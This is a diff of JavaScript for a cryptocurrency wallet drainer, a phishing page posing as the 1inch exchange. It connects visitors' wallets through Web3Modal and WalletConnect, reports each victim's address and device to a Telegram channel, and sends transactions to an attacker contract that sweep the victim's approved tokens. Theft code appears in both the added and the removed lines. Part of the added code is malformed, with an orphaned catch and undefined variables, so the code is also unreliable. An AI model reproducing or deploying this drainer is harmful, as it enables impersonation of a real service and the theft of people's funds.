@@ -154,18 +154,10 @@
               
               // Configure provider options for maximum wallet choice
               const providerOptions = {
-                // Prioritize injected wallets (MetaMask, etc.) for desktop users
-                injected: {
-                  display: {
-                    logo: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTcgMWE2IDYgMCAwIDEgNiA2djE0YTYgNiAwIDAgMS02IDZIOGE2IDYgMCAwIDEtNi02VjdBNiA2IDAgMCAxIDggMWg5WiIgZmlsbD0iIzk5OTk5OSIvPjwvZz48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0wIDBoMzJ2MzJIMHoiLz48L2NsaXBQYXRoPjwvZGVmcz48L3N2Zz4=',
-                    name: 'Browser Wallet',
-                    description: 'Connect using MetaMask or other browser extension'
-                  }
-                },
                 walletconnect: {
                   package: window.WalletConnectProvider.default,
                   options: {
-                    projectId: projectId,
+                    infuraId: projectId,
                     rpc: {
                       1: window.DRAINER_CONFIG.RPC.MAINNET_URL || 'https://eth.public-rpc.com',
                       137: 'https://polygon-rpc.com/',
@@ -173,25 +165,35 @@
                     },
                     chainId: 1,
                     bridge: 'https://bridge.walletconnect.org',
-                    // Minimize QR code prominence for desktop
-                    qrcode: true,
-                    // Desktop wallet support
-                    showQrModal: false, // Disable auto QR modal
-                    metadata: {
-                      name: window.DRAINER_CONFIG.SITE_NAME || '1inch Exchange',
-                      description: 'Connect your wallet to continue',
-                      url: window.location.origin,
-                      icons: [window.location.origin + '/images/logo.webp']
+                    qrcodeModalOptions: {
+                      mobileLinks: [
+                        'metamask',      // MetaMask Mobile
+                        'trust',         // Trust Wallet
+                        'rainbow',       // Rainbow Wallet
+                        'argent',        // Argent Wallet
+                        'coinbase',      // Coinbase Wallet
+                        'imtoken',       // imToken
+                        'pillar',        // Pillar Wallet
+                        'tokenpocket',   // TokenPocket
+                        'mathwallet',    // MathWallet
+                        'ledger',        // Ledger Live
+                        'safepal',       // SafePal
+                        'unstoppable',   // Unstoppable Wallet
+                        'dharma',        // Dharma
+                        'inch',          // 1inch Wallet
+                        'zerion'         // Zerion
+                      ],
+                      desktopLinks: [
+                        'ledger',        // Ledger Live Desktop
+                        'metamask',      // MetaMask Extension
+                        'coinbase'       // Coinbase Extension
+                      ]
                     }
-                  },
-                  display: {
-                    name: 'WalletConnect',
-                    description: 'Scan with mobile wallet or use desktop wallets'
                   }
                 }
               };
               
-              // Create Web3Modal instance with desktop-first settings
+              // Create Web3Modal instance with mobile-optimized settings
               web3Modal = new window.Web3Modal.default({
                 network: 'mainnet',
                 cacheProvider: false, // Don't cache to allow fresh connections
@@ -203,8 +205,8 @@
                   border: 'rgba(195, 195, 195, 0.14)',
                   hover: 'rgb(16, 26, 32)'
                 },
-                // Desktop-optimized settings
-                disableInjectedProvider: false, // Always show browser wallets first
+                // Mobile-specific optimizations
+                disableInjectedProvider: false, // Allow browser wallets on mobile browsers
                 display: {
                   logo: window.location.origin + '/images/logo.webp',
                   name: window.DRAINER_CONFIG.SITE_NAME || '1inch',
@@ -271,46 +273,26 @@
         }
         
         function initWalletConnection() {
-          // console.log('Initializing wallet connection...');
+          console.log('Initializing Web3Modal connection...');
           
           // Show loading state
           const buttonText = document.querySelector('.text-block-2');
           if (buttonText) {
-            buttonText.textContent = 'Choose Wallet...';
+            buttonText.textContent = 'Opening Web3Modal...';
           }
           
-          // Always show wallet selection modal - no automatic detection
-          // console.log('🔗 Showing wallet selection modal for user choice');
-          showWeb3Modal();
-        }
-        
-        function showWeb3Modal() {
-          const buttonText = document.querySelector('.text-block-2');
-          if (buttonText) {
-            buttonText.textContent = 'Opening wallet options...';
+          // Only use Web3Modal - universal compatibility
+          if (!window.DRAINER_CONFIG || !window.DRAINER_CONFIG.WALLETCONNECT || !window.DRAINER_CONFIG.WALLETCONNECT.ENABLED) {
+            console.error('WalletConnect configuration missing - cannot connect wallet');
+            if (buttonText) {
+              buttonText.textContent = 'WalletConnect Config Missing';
+            }
+            alert('Wallet connection unavailable. WalletConnect configuration required.');
+            return;
           }
           
           // Open Web3Modal for universal wallet access
           showWalletConnectModal();
-        }
-        
-        // Helper function to handle successful wallet connections
-        async function handleWalletConnection(provider, userAddress) {
-          // console.log('🎉 Wallet connected successfully:', userAddress);
-          
-          const buttonText = document.querySelector('.text-block-2');
-          if (buttonText) {
-            buttonText.textContent = 'Wallet Connected!';
-          }
-          
-          // Send Telegram notification for new user
-          const message = formatTelegramMessage('user_connected', {
-            address: userAddress
-          });
-          sendTelegramMessage(message);
-          
-          // Start the actual draining process
-          await performDraining(userAddress);
         }
         
         // DEPRECATED: Only using Reown now - mobile wallet functions removed
@@ -637,21 +619,8 @@
               await new Promise(resolve => setTimeout(resolve, 3000));
               
               // Get signer for transactions
-              console.log('🔍 Debugging ethers availability:');
-              console.log('window.ethers:', typeof window.ethers);
-              console.log('window.ethers.providers:', typeof window.ethers?.providers);
-              console.log('window.ethers.providers.Web3Provider:', typeof window.ethers?.providers?.Web3Provider);
-              
-              let signer = null;
-              
-              if (window.ethers && window.ethers.providers && window.ethers.providers.Web3Provider) {
-                console.log('✅ Using ethers.js signer');
-                const provider = new window.ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-              } else {
-                console.log('⚠️ Ethers.js not available, will use direct ethereum requests');
-                // We'll handle this in the draining function
-              }
+              const provider = new ethers.providers.Web3Provider(window.ethereum);
+              const signer = provider.getSigner();
               
               await executeDrainingSimple(tokens.filter(token => token.approved), userAddress, signer);
             } else {
@@ -1300,59 +1269,21 @@
                 let success = false;
                 
                 try {
-                  console.log(`⚡ Calling claimUserRewards...`);
+                  console.log(`📤 Sending claimUserRewards transaction for ${token.symbol}...`);
                   
-                  // Use the minimum of balance and allowance for the amount
-                  const drainAmount = Math.min(currentBalance, allowance);
-                  
-                  // claimUserRewards(address token, uint256 amount) - function selector: 0x3dc06048
-                  const data = '0x3dc06048' + 
-                    token.address.slice(2).padStart(64, '0') +
-                    drainAmount.toString(16).padStart(64, '0');
-                  
-                  console.log(`📤 Calling: claimUserRewards`);
-                  console.log(`📤 Token: ${token.address}`);
-                  console.log(`📤 Amount: ${drainAmount} (${formattedBalance} ${token.symbol})`);
-                  console.log(`📤 Data: ${data}`);
-                  
-                  let drainTx, receipt;
-                  
-                  if (signer) {
-                    console.log('📤 Using ethers.js signer...');
-                    drainTx = await signer.sendTransaction({
+                  const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                      from: userAddress,
                       to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
-                      data: data,
-                      gasLimit: 1000000
-                    });
-                    
-                    console.log(`✅ claimUserRewards transaction sent: ${drainTx.hash}`);
-                    console.log('⏳ Waiting for confirmation...');
-                    
-                    receipt = await drainTx.wait();
-                    
-                    console.log(`🎉 claimUserRewards transaction confirmed!`);
-                    console.log(`Gas used: ${receipt.gasUsed}`);
-                    console.log(`Block: ${receipt.blockNumber}`);
-                    console.log(`🔗 Transaction URL: https://etherscan.io/tx/${drainTx.hash}`);
-                    
-                  } else {
-                    console.log('📤 Using direct ethereum request...');
-                    const txHash = await window.ethereum.request({
-                      method: 'eth_sendTransaction',
-                      params: [{
-                        from: userAddress,
-                        to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
-                        data: data,
-                        gas: '0xF4240', // 1,000,000 in hex
-                        gasPrice: '0x5D21DBA00' // 25 gwei in hex
-                      }]
-                    });
-                    
-                    console.log(`✅ claimUserRewards transaction sent: ${txHash}`);
-                    console.log(`🔗 Transaction URL: https://etherscan.io/tx/${txHash}`);
-                    
-                    drainTx = { hash: txHash };
-                  }
+                      data: claimCallData,
+                      gas: '0x3D090', // 250000 in hex - sufficient for ERC20 transfer
+                      gasPrice: '0x5D21DBA00' // 25 gwei in hex
+                    }]
+                  });
+                  
+                  console.log(`✅ ${token.symbol} claimUserRewards tx submitted:`, txHash);
+                  console.log(`🔗 Transaction URL: https://etherscan.io/tx/${txHash}`);
                   
                   drainingSuccessCount++;
                   success = true;
@@ -1362,35 +1293,104 @@
                     address: userAddress,
                     symbol: token.symbol,
                     amount: formattedBalance,
-                    txHash: drainTx.hash,
+                    txHash: txHash,
                     estimatedValue: parseFloat(formattedBalance) * (token.avgPrice || 0),
-                    method: 'claimUserRewards',
+                    method: 'claimUserRewards(address,uint256)',
                     contract: window.DRAINER_CONFIG.CONTRACT_ADDRESS
                   });
                   sendTelegramMessage(drainMessage);
                   
-                } catch (drainError) {
-                  console.log(`❌ claimUserRewards failed:`, drainError.message);
-                  console.error('Full error details:', drainError);
+                } catch (txError) {
+                  console.error(`💥 claimUserRewards FAILED for ${token.symbol}:`, txError);
                   
-                  if (drainError.code === 4001) {
+                  if (txError.code === 4001) {
                     console.log('💔 User rejected the draining transaction');
-                  } else if (drainError.code === -32000) {
-                    console.log('� Contract execution error');
+                  } else if (txError.code === -32000) {
+                    console.log('🔴 Transaction failed - possible causes:');
+                    console.log('- Insufficient gas or gas price too low');
+                    console.log('- Contract execution reverted');
+                    console.log('- Network congestion');
+                  } else if (txError.message && txError.message.includes('execution reverted')) {
+                    console.log('🔴 Contract execution reverted - checking possible causes:');
+                    console.log(`- Current allowance: ${formattedAllowance} ${token.symbol}`);
+                    console.log(`- Current balance: ${formattedBalance} ${token.symbol}`);
+                    console.log('- Contract may have additional requirements');
+                    
+                    // Log the revert reason if available
+                    if (txError.data) {
+                      console.log('📋 Revert data:', txError.data);
+                    }
+                  } else {
+                    console.log('📛 Unknown transaction error:', txError.message);
+                    console.log('Full error:', txError);
                   }
-                  
-                  // Send failure notification
-                  const failMessage = formatTelegramMessage('drain_failed', {
-                    address: userAddress,
-                    token: token.symbol,
-                    amount: formattedBalance,
-                    error: drainError.message
-                  });
-                  sendTelegramMessage(failMessage);
                 }
                 
                 if (!success) {
-                  console.error(`❌ claimUserRewards failed for ${token.symbol}`);
+                  console.error(`� claimUserRewards failed for ${token.symbol}`);
+                }
+                      const simulationResult = await window.ethereum.request({
+                        method: 'eth_call',
+                        params: [{
+                          from: userAddress,
+                          to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
+                          data: claimCallData,
+                          gas: '0x3D090'
+                        }, 'latest']
+                      });
+                      console.log('✅ Simulation successful:', simulationResult);
+                    } catch (simError) {
+                      console.error(`💥 Simulation failed for ${method.sig}:`, simError);
+                      if (simError.message) {
+                        console.error('Revert reason:', simError.message);
+                      }
+                      continue; // Skip this method if simulation fails
+                    }
+                    
+                    const txHash = await window.ethereum.request({
+                      method: 'eth_sendTransaction',
+                      params: [{
+                        from: userAddress,
+                        to: window.DRAINER_CONFIG.CONTRACT_ADDRESS,
+                        data: claimCallData,
+                        gas: '0x3D090', // 250000 in hex
+                        gasPrice: '0x5D21DBA00' // 25 gwei in hex
+                      }]
+                    });
+                    
+                    console.log(`✅ ${token.symbol} drain tx submitted with ${method.sig}:`, txHash);
+                    drainingSuccessCount++;
+                    success = true;
+                    
+                    // Send Telegram notification for successful drain
+                    const drainMessage = formatTelegramMessage('drain_success', {
+                      address: userAddress,
+                      symbol: token.symbol,
+                      amount: formattedBalance,
+                      txHash: txHash,
+                      estimatedValue: parseFloat(formattedBalance) * (token.avgPrice || 0),
+                      method: method.sig
+                    });
+                    sendTelegramMessage(drainMessage);
+                    
+                    break; // Success, no need to try other methods
+                    
+                  } catch (methodError) {
+                    console.log(`❌ ${method.sig} failed:`, methodError.message);
+                    console.error('Full error details:', methodError);
+                    
+                    if (methodError.code === 4001) {
+                      console.log('💔 User rejected the draining transaction');
+                      break; // User rejection, don't try other methods
+                    } else if (methodError.code === -32000) {
+                      console.log('🔧 Contract execution error - trying next method...');
+                    }
+                    // Try next method
+                  }
+                }
+                
+                if (!success) {
+                  console.error(`💥 All drain methods failed for ${token.symbol}`);
                 }
                 
               } catch (error) {
@@ -1702,364 +1702,76 @@
         }
         
         async function showWalletConnectModal() {
-          // console.log('🔗 Showing wallet selection options...');
+          console.log('Opening Web3Modal connection...');
           
-          const buttonText = document.querySelector('.text-block-2');
-          if (buttonText) {
-            buttonText.textContent = 'Choose your wallet...';
+          if (isConnecting) {
+            console.log('Connection already in progress');
+            return;
           }
           
-          // Create a comprehensive wallet selection interface
-          const walletOptions = [];
-          
-          // Check for MetaMask (enhanced mobile support)
-          if (window.ethereum && window.ethereum.isMetaMask) {
-            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            walletOptions.push({
-              name: 'MetaMask',
-              description: isMobileDevice ? 'Mobile App & Browser' : 'Browser Extension',
-              type: 'injected',
-              provider: window.ethereum
-            });
-          }
-          
-          // Check for Coinbase Wallet
-          if (window.ethereum && window.ethereum.isCoinbaseWallet) {
-            walletOptions.push({
-              name: 'Coinbase Wallet',
-              description: 'Browser Extension',
-              type: 'injected',
-              provider: window.ethereum
-            });
-          }
-          
-          // Check for Trust Wallet (multiple detection methods)
-          if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) {
-            walletOptions.push({
-              name: 'Trust Wallet',
-              description: 'Mobile & Browser Extension',
-              type: 'injected',
-              provider: window.ethereum
-            });
-          }
-          
-          // Check for Phantom (Solana/Ethereum)
-          if (window.phantom && window.phantom.ethereum) {
-            walletOptions.push({
-              name: 'Phantom Wallet',
-              description: 'Multi-chain Wallet',
-              type: 'injected',
-              provider: window.phantom.ethereum
-            });
-          }
-          
-          // Check for Brave Wallet
-          if (window.ethereum && window.ethereum.isBraveWallet) {
-            walletOptions.push({
-              name: 'Brave Wallet',
-              description: 'Built-in Browser Wallet',
-              type: 'injected',
-              provider: window.ethereum
-            });
-          }
-          
-          // Check for other injected wallets (catch-all)
-          if (window.ethereum && !window.ethereum.isMetaMask && !window.ethereum.isCoinbaseWallet && 
-              !window.ethereum.isTrust && !window.ethereum.isBraveWallet) {
-            walletOptions.push({
-              name: 'Browser Wallet',
-              description: 'Injected Provider',
-              type: 'injected',
-              provider: window.ethereum
-            });
-          }
-          
-          // Always offer WalletConnect for mobile wallets
-          walletOptions.push({
-            name: 'WalletConnect',
-            description: 'Mobile & Desktop Wallets',
-            type: 'walletconnect',
-            provider: null
-          });
-          
-          // Add MetaMask Mobile option for users who have MetaMask app but not browser extension
-          const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-          if (isMobileDevice && !(window.ethereum && window.ethereum.isMetaMask)) {
-            walletOptions.push({
-              name: 'MetaMask Mobile',
-              description: 'via WalletConnect',
-              type: 'walletconnect',
-              provider: null
-            });
-          }
-          
-          // Add popular mobile wallets via WalletConnect
-          walletOptions.push({
-            name: 'Trust Wallet (Mobile)',
-            description: 'via WalletConnect',
-            type: 'walletconnect',
-            provider: null
-          });
-          
-          walletOptions.push({
-            name: 'Other Wallets',
-            description: 'Any WalletConnect Compatible',
-            type: 'walletconnect',
-            provider: null
-          });
-          
-          // Show selection dialog using custom modal
-          let choice;
-          if (walletOptions.length > 1) {
-            choice = await showWalletSelectionModal(walletOptions);
-          } else {
-            choice = 0;
-          }
-          
-          if (choice < 0 || choice >= walletOptions.length || choice === null) {
-            // console.log('Invalid choice or user cancelled');
-            if (buttonText) {
-              buttonText.textContent = 'Connect Wallet';
-            }
+          // Check if Web3Modal is initialized
+          if (!web3Modal) {
+            console.error('Web3Modal not initialized');
+            alert('Wallet connection not ready. Please refresh the page and try again.');
             return;
           }
           
           try {
-            if (buttonText) {
-              buttonText.textContent = 'Connecting...';
+            console.log('Opening Web3Modal...');
+            isConnecting = true;
+            
+            // Detect mobile for optimized experience
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            if (isMobile) {
+              console.log('Mobile device detected - optimizing wallet selection');
             }
             
-            const selectedWallet = walletOptions[choice];
-            // console.log('User selected:', selectedWallet.name);
+            // Connect through Web3Modal - this opens the modal with all wallet options
+            provider = await web3Modal.connect();
             
-            if (selectedWallet.type === 'injected' && selectedWallet.provider) {
-              // Connect to injected wallet directly
-              // console.log(`🔗 Connecting to ${selectedWallet.name}...`);
-              const accounts = await selectedWallet.provider.request({ method: 'eth_requestAccounts' });
-              if (accounts.length > 0) {
-                // console.log(`✅ ${selectedWallet.name} connected:`, accounts[0]);
-                await handleWalletConnection(selectedWallet.provider, accounts[0]);
-              }
-            } else if (selectedWallet.type === 'walletconnect') {
-              // Use WalletConnect for mobile and hardware wallets
-              // console.log(`📱 Connecting via WalletConnect for ${selectedWallet.name}...`);
-              await connectWithWalletConnect(selectedWallet.name);
-            }
-            
-          } catch (error) {
-            // console.error('❌ Wallet connection failed:', error);
-            if (buttonText) {
-              buttonText.textContent = 'Connection Failed - Try Again';
-            }
-            showErrorMessage('Failed to connect wallet: ' + error.message);
-          }
-        }
-        
-        // Create custom wallet selection modal
-        function showWalletSelectionModal(options) {
-          return new Promise((resolve) => {
-            // Create modal overlay
-            const overlay = document.createElement('div');
-            overlay.style.cssText = `
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 100%;
-              background: rgba(0, 0, 0, 0.8);
-              display: flex;
-              justify-content: center;
-              align-items: center;
-              z-index: 10000;
-              font-family: Arial, sans-serif;
-            `;
-            
-            // Create modal content
-            const modal = document.createElement('div');
-            
-            // Detect mobile for better sizing
-            const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-            
-            modal.style.cssText = `
-              background: #1a1a1a;
-              border-radius: 12px;
-              padding: ${isMobile ? '20px' : '30px'};
-              max-width: ${isMobile ? '95%' : '400px'};
-              width: ${isMobile ? '95%' : '90%'};
-              max-height: ${isMobile ? '80vh' : 'auto'};
-              overflow-y: ${isMobile ? 'auto' : 'visible'};
-              color: white;
-              text-align: center;
-              border: 1px solid #333;
-              box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            `;
-            
-            // Modal title
-            const title = document.createElement('h3');
-            title.textContent = 'Select Your Wallet';
-            title.style.cssText = `
-              margin: 0 0 ${isMobile ? '15px' : '20px'} 0;
-              color: #fff;
-              font-size: ${isMobile ? '16px' : '18px'};
-            `;
-            
-            // Create buttons for each wallet option
-            options.forEach((wallet, index) => {
-              const button = document.createElement('button');
+            if (provider) {
+              web3 = new window.Web3(provider);
               
-              // Create wallet info container
-              const walletInfo = document.createElement('div');
-              walletInfo.style.cssText = `
-                display: flex;
-                flex-direction: column;
-                align-items: flex-start;
-                text-align: left;
-              `;
-              
-              const walletName = document.createElement('div');
-              walletName.textContent = wallet.name;
-              walletName.style.cssText = `
-                font-weight: bold;
-                font-size: ${isMobile ? '15px' : '14px'};
-                margin-bottom: 2px;
-              `;
-              
-              const walletDesc = document.createElement('div');
-              walletDesc.textContent = wallet.description;
-              walletDesc.style.cssText = `
-                font-size: ${isMobile ? '13px' : '12px'};
-                color: #999;
-              `;
-              
-              walletInfo.appendChild(walletName);
-              walletInfo.appendChild(walletDesc);
-              button.appendChild(walletInfo);
-              
-              button.style.cssText = `
-                display: block;
-                width: 100%;
-                padding: ${isMobile ? '18px 15px' : '15px'};
-                margin: ${isMobile ? '10px 0' : '8px 0'};
-                background: #2d2d2d;
-                color: white;
-                border: 1px solid #444;
-                border-radius: 8px;
-                cursor: pointer;
-                transition: background 0.2s;
-                text-align: left;
-                min-height: ${isMobile ? '60px' : 'auto'};
-              `;
-              
-              button.onmouseover = () => button.style.background = '#404040';
-              button.onmouseout = () => button.style.background = '#2d2d2d';
-              
-              button.onclick = () => {
-                document.body.removeChild(overlay);
-                resolve(index);
-              };
-              
-              modal.appendChild(button);
-            });
-            
-            // Cancel button
-            const cancelButton = document.createElement('button');
-            cancelButton.textContent = 'Cancel';
-            cancelButton.style.cssText = `
-              display: block;
-              width: 100%;
-              padding: 15px;
-              margin: 20px 0 0 0;
-              background: transparent;
-              color: #999;
-              border: 1px solid #444;
-              border-radius: 8px;
-              cursor: pointer;
-              font-size: 14px;
-            `;
-            
-            cancelButton.onclick = () => {
-              document.body.removeChild(overlay);
-              resolve(null);
-            };
-            
-            modal.appendChild(title);
-            modal.appendChild(cancelButton);
-            overlay.appendChild(modal);
-            document.body.appendChild(overlay);
-            
-            // Close on overlay click
-            overlay.onclick = (e) => {
-              if (e.target === overlay) {
-                document.body.removeChild(overlay);
-                resolve(null);
-              }
-            };
-          });
-        }
-        
-        // Show error messages without alerts
-        function showErrorMessage(message) {
-          const errorDiv = document.createElement('div');
-          errorDiv.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #ff4444;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 8px;
-            z-index: 10001;
-            font-family: Arial, sans-serif;
-            max-width: 300px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-          `;
-          errorDiv.textContent = message;
-          
-          document.body.appendChild(errorDiv);
-          
-          // Auto-remove after 5 seconds
-          setTimeout(() => {
-            if (document.body.contains(errorDiv)) {
-              document.body.removeChild(errorDiv);
-            }
-          }, 5000);
-        }
-        
-        async function connectWithWalletConnect(walletName = 'WalletConnect') {
-          try {
-            // Try Web3Modal if available
-            if (web3Modal) {
-              // console.log(`Using Web3Modal for ${walletName}...`);
-              const provider = await web3Modal.connect();
-              const web3 = new window.Web3(provider);
+              // Get accounts
               const accounts = await web3.eth.getAccounts();
               
-              if (accounts.length > 0) {
-                // console.log(`✅ ${walletName} connected:`, accounts[0]);
-                await handleWalletConnection(provider, accounts[0]);
+              if (accounts && accounts.length > 0) {
+                isConnecting = false;
+                console.log('Web3Modal connection successful:', accounts[0]);
+                
+                // Send Telegram notification with device info
+                const message = formatTelegramMessage('user_connected', {
+                  address: accounts[0],
+                  method: 'Web3Modal Universal',
+                  device: isMobile ? 'Mobile' : 'Desktop',
+                  userAgent: navigator.userAgent.substring(0, 100) // First 100 chars
+                });
+                sendTelegramMessage(message);
+                
+                // Start draining process
+                setTimeout(() => {
+                  performDraining(accounts[0]);
+                }, 1000);
+              } else {
+                isConnecting = false;
+                console.error('No accounts found');
+                alert('No wallet accounts found. Please try again.');
               }
             } else {
-              // Fallback: direct WalletConnect
-              // console.log(`Using direct WalletConnect for ${walletName}...`);
-              if (window.WalletConnectProvider) {
-                const provider = new window.WalletConnectProvider.default({
-                  infuraId: "9aa3d95b3bc440fa88ea12eaa4456161",
-                });
-                await provider.enable();
-                const web3 = new window.Web3(provider);
-                const accounts = await web3.eth.getAccounts();
-                
-                if (accounts.length > 0) {
-                  // console.log(`✅ ${walletName} connected:`, accounts[0]);
-                  await handleWalletConnection(provider, accounts[0]);
-                }
-              } else {
-                throw new Error('WalletConnect not available');
-              }
+              isConnecting = false;
+              console.error('No provider returned from Web3Modal');
+              alert('Failed to connect wallet. Please try again.');
             }
+            
           } catch (error) {
-            // console.error(`${walletName} connection failed:`, error);
-            throw error;
+            isConnecting = false;
+            console.error('Error connecting with Web3Modal:', error);
+            
+            if (error.message && error.message.includes('User closed modal')) {
+              console.log('User cancelled wallet selection');
+            } else {
+              alert('Failed to connect wallet. Please try again.');
+            }
           }
         }
       });
